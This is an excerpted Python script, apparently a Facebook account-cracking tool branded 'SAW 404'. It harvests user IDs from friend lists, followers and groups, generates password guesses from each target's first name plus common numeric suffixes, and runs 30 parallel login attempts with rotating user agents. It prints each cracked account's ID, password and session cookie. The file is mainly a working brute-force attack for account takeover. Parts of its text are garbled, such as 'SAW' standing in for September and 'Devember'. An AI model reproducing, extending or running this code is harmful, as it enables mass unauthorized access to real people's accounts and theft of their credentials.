...
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'SAW','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'SAW','10':'October','11':'November','12':'Devember'}
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t [green] Cookies FB [white] '))
		...
		print(f'insta 127.0.2 \n python SAW-x-.py ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s SAW %s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tname your fb :  [blue]%s[yellow] '%(my_name)))
	print(f'{hh}——>[•]  ID : '+str(my_id))
	print(f'{m}——>[•]    Ip  : {ip}')
	print('')
	print('')
	print(f'\033[0;1m[ \033[31;1m1 \033[0;1m] PUBLIC ID CLONE ( SAW ) ')
	print(f'\033[0;1m[ \033[31;1m5 \033[0;1m] YOTR HACK FB ?  ')
	print(f'\033[0;1m[ \033[31;1m0 \033[0;1m] LOGOUT ')
	print('')
	_____alvino__adijaya_____ = input('\n CHOICE : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['676']:
		dump_pengikut()
	elif _____alvino__adijaya_____ in ['677']:
		grup()
	elif _____alvino__adijaya_____ in ['678']:
		crack_file()
...
#-----------------[ SAW-404 ]-----------------#
def result():
	print(f' 1. SAW {h}OK{x} ')
	print(f' 2. SAW {k}CP{x} ')
	print(' 3. Logout 	')
	kz = input(f'\n')
	if kz in ['2']:
...
def dump_massal():
	...
	try:
		print('')
		print(f' ID Fb SAW --> {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ SAW-404 ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/SAW-404')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/SAW-404/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/SAW-404/'+geh,'r').read().splitlines()
		except:
			print(' ')
			time.sleep(2)
			back()
...
def setting():
	...
	print(f'{x}{p}[•] 1. FB ID NEW ')
	print(f'{b}[•] 2. FB ID ')
	print(f'{hh}[•] 3. FB ID ALL  {x} {hh}[SAW]{x}')
	print('')
	...
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input('[•] Password AUTO ? ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] SAW \n[[cyan]•[white]] SAW : [green] name1980,name12345,name[white] '))
		pwku=input('[•] Password  : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
...
def passwrd():
	print('')
	print(f'[•]  {h}OK{x} SAW : {h}OK/%s {x}'%(okc))
	print(f'[•]  {k}CP{x} SAW : {k}CP/%s {x}'%(cpc))
	print(f'SAW \n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['name1980','name12345','name']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					...
					pwv.append(frs+'22221111')
					pwv.append(frs+'12123434')
					pwv.append(frs+'1212@')
					pwv.append(frs+'1212@#')
					pwv.append(frs+'1212#')
					pwv.append(frs+'1212#@')
					...
					pwv.append(frs+'2121')
					pwv.append(frs+'21')
					pwv.append(frs+'98765')
					pwv.append(frs+'9876')
					pwv.append(frs+'6789')
					pwv.append(frs+'56789')
					pwv.append(frs+'12345123456')
					pwv.append(frs+'123412345')
					pwv.append(frs+'1020304050')
					pwv.append(frs+'10203040')
					pwv.append(frs+'1020')
					pwv.append(frs+'102030')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'12345678910')
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan] HACKING [green] SAW 404 [cyan][white] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rSAW {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x} SAW OK —> {H}{idf}|{pw}|{kuki}{N}')
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r {P}[{bo}SAW{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				print(f'\r{x} SAW OK —> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s [•] SAW  %s/%s [!] OK:%s [+] CP:%s [-] %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
